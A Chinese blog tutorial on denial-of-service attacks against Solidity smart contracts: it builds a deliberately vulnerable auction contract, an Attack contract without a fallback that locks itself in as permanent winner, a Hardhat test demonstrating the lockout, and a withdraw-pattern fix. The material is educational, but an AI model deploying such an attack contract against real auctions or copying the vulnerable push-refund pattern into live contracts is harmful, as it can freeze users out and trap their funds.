---
title: Web3系列教程之高级篇---7：如何阻止用户访问智能合约
description: null
author: 李留白
weight: 0
date: 2022-08-07T02:08:14.535Z
lastmod: 2022-08-07T02:08:42.695Z
tags: []
categories:
  - 区块链
  - WEB3.0
featuredImage: https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/R3RYera.png
---

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/20220807095615.png)

拒绝服务（DOS）攻击是一种旨在使网络、网站或服务失灵、关闭或中断的攻击。本质上，它意味着攻击者以某种方式阻止普通用户访问网络、网站或服务，从而拒绝他们的服务。这是一个非常常见的攻击，我们在web2中也都知道，但今天我们将尝试模仿对智能合约的拒绝服务攻击

加油🚀

## 智能合约中的 DOS 攻击

### 会发生什么？

将有两个智能合约 - `Good.sol`和`Attack.sol`。`Good.sol`将被用来运行一个样本拍卖，它将有一个功能，当前用户可以通过向`Good.sol`发送比前一个赢家发送的ETH更高的金额来成为当前拍卖的赢家。赢家被替换后，旧的赢家将被送回他最初发送给合约的钱。

`Attack.sol`的攻击方式是，在成为当前拍卖的赢家后，即使试图获胜的地址愿意投入更多的ETH，它也不允许其他任何人取代它。因此，`Attack.sol`将使`Game.sol`受到DOS攻击，因为在它成为赢家后，它将拒绝任何其他地址成为赢家的能力。

### 建造

让我们构建一个示例，您可以在其中体验攻击是如何发生的。

- 要设置一个Hardhat项目，请打开终端，在一个新的文件夹中执行这些命令

```bash
npm init --yes
npm install --save-dev hardhat
```

- 如果你不是在mac上，请做这个额外的步骤，也安装这些库 :)

```
npm install --save-dev @nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers
```

- 在你安装Hardhat的同一目录下运行。

```bash
npx hardhat
```

- 选择`Create a basic sample project`
- 对已指定的`Hardhat Project root`按回车键
- 如果你想添加一个`.gitignore`，请按回车键。
- 按回车键`Do you want to install this sample project's dependencies with npm (@nomiclabs/hardhat-waffle ethereum-waffle chai @nomiclabs/hardhat-ethers ethers)?`

现在你有一个准备好的hardhat项目了!

让我们创建拍卖合同，命名为`Good.sol`，代码如下。

```solidity
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;

    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        (bool sent, ) = currentWinner.call{value: currentAuctionPrice}("");
        if (sent) {
            currentAuctionPrice = msg.value;
            currentWinner = msg.sender;
        }
    }
}
```

这是一个相当基本的合同，它存储了最后一个最高出价人的地址，以及他们出价的价值。任何人都可以调用`setCurrentAuctionPrice`并发送比`currentAuctionPrice`更多的ETH，这将首先尝试将他们的ETH送回给最后的出价人，然后将交易调用者设置为新的最高出价人，并提供他们的ETH值。

现在，在`contracts`目录下创建一个名为`Attack.sol`的合同，并编写以下几行代码

```
//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}
```

这个合约有一个叫做`attack()`的函数，它只是调用`Good`合约的`setCurrentAuctionPrice`。但是，请注意，这个合约没有一个可以接收ETH的`fallback()`函数。稍后会有更多这方面的内容。

让我们创建一个攻击，使 `Good`合约变得无法使用。在`test`文件夹下创建一个名为`attack.js`的新文件，并在其中添加以下几行代码

```
const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers, waffle } = require("hardhat");

describe("Attack", function () {
  it("After being declared the winner, Attack.sol should not allow anyone else to become the winner", async function () {
    // Deploy the good contract
    const goodContract = await ethers.getContractFactory("Good");
    const _goodContract = await goodContract.deploy();
    await _goodContract.deployed();
    console.log("Good Contract's Address:", _goodContract.address);

    // Deploy the Attack contract
    const attackContract = await ethers.getContractFactory("Attack");
    const _attackContract = await attackContract.deploy(_goodContract.address);
    await _attackContract.deployed();
    console.log("Attack Contract's Address", _attackContract.address);

    // Now lets attack the good contract
    // Get two addresses
    const [_, addr1, addr2] = await ethers.getSigners();

    // Initially let addr1 become the current winner of the aution
    let tx = await _goodContract.connect(addr1).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("1"),
    });
    await tx.wait();

    // Start the attack and make Attack.sol the current winner of the auction
    tx = await _attackContract.attack({
      value: ethers.utils.parseEther("3.0"),
    });
    await tx.wait();

    // Now lets trying making addr2 the current winner of the auction
    tx = await _goodContract.connect(addr2).setCurrentAuctionPrice({
      value: ethers.utils.parseEther("4"),
    });
    await tx.wait();

    // Now lets check if the current winner is still attack contract
    expect(await _goodContract.currentWinner()).to.equal(
      _attackContract.address
    );
  });
});
```

请注意`Attack.sol`是如何将`Good.sol`引入DOS攻击的。首先`addr1`通过调用`Good.sol`的`setCurrentAuctionPrice`成为当前赢家，然后`Attack.sol`通过攻击函数发送比`addr1`更多的ETH成为当前赢家。现在，当`addr2`试图成为新的赢家时，它将无法做到，因为`Good.sol`合约中的检查`（if (sent)）`验证了只有当ETH被送回给上一个当前赢家时，当前赢家才会被改变。

由于`Attack.sol`没有接受ETH付款所需的`fallback`函数，`sent`总是`false`，因此当前赢家永远不会被更新，`addr2`也永远不会成为当前赢家。

要运行测试，在你的终端上指向本级别的根目录，执行以下命令

```
npx hardhat test
```

当测试通过后，你会发现`Good.sol`现在受到了DOS攻击，因为在`Attack.sol`成为当前的赢家后，在其他地址可以成为当前赢家。

## 预防

- 你可以为以前的赢家创建一个单独的`withdraw`功能。

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract Good {
    address public currentWinner;
    uint public currentAuctionPrice;
    mapping(address => uint) public balances;
    
    constructor() {
        currentWinner = msg.sender;
    }

    function setCurrentAuctionPrice() public payable {
        require(msg.value > currentAuctionPrice, "Need to pay more than the currentAuctionPrice");
        balances[currentWinner] += currentAuctionPrice;
        currentAuctionPrice = msg.value;
        currentWinner = msg.sender;
    }
    
    function withdraw() public {
        require(msg.sender != currentWinner, "Current winner cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

希望你喜欢这篇文章❤️，继续吧。

## 参考

- [Solidity by example](https://solidity-by-example.org/)

![](https://hicoldcat.oss-cn-hangzhou.aliyuncs.com/img/my.png)